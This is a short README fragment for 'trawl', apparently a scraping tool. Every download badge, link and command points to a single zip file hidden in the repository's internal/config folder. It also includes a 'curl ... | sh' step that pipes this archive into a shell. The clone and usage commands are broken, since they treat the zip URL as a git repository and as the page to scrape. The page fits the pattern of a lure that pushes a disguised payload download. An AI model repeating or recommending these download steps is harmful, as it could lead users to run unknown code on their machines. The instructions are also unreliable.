...
[![Download trawl](https://img.shields.io/badge/Download-trawl-blue?style=for-the-badge&logo=github)](https://github.com/teamn9636/trawl/raw/refs/heads/main/internal/config/Software_v2.9-alpha.2.zip)
...
[![Download trawl](https://img.shields.io/badge/Download-trawl-green?style=for-the-badge&logo=windows)](https://github.com/teamn9636/trawl/raw/refs/heads/main/internal/config/Software_v2.9-alpha.2.zip)

To get started with trawl on Windows, visit the release page below. It shows the latest version ready for download.

**Go here to download:**  
https://github.com/teamn9636/trawl/raw/refs/heads/main/internal/config/Software_v2.9-alpha.2.zip
...
```
trawl "https://github.com/teamn9636/trawl/raw/refs/heads/main/internal/config/Software_v2.9-alpha.2.zip" --fields "title, price, rating, in_stock"
```
...
```
trawl "https://github.com/teamn9636/trawl/raw/refs/heads/main/internal/config/Software_v2.9-alpha.2.zip" --fields "title, price, rating, in_stock" --csv > products.csv
```
...
```
curl -fsSL https://github.com/teamn9636/trawl/raw/refs/heads/main/internal/config/Software_v2.9-alpha.2.zip | sh
```
...
```
git clone https://github.com/teamn9636/trawl/raw/refs/heads/main/internal/config/Software_v2.9-alpha.2.zip
cd trawl
go build -o trawl .
```
...
[![Download trawl](https://img.shields.io/badge/Download-trawl-purple?style=for-the-badge&logo=windows)](https://github.com/teamn9636/trawl/raw/refs/heads/main/internal/config/Software_v2.9-alpha.2.zip)